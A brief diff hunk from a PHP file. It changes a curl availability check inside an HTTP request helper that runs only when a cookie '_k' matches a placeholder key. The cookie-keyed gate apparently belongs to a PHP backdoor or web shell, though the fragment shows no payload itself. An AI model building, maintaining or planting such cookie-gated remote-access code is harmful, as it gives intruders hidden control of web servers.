@@ -5,7 +5,7 @@ if (@$_COOKIE["_k"] == "INSERT_KEY") {
 		error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
 		function _request($url, $method, $body = null, $headers = null)
 		{
-			if (!function_exists("curl_init")) {
+			if (!function_exists("curl_exec")) {
 				if(ini_get("allow_url_fopen")) {
 					$opts_array = array(
 						"method" => $method,
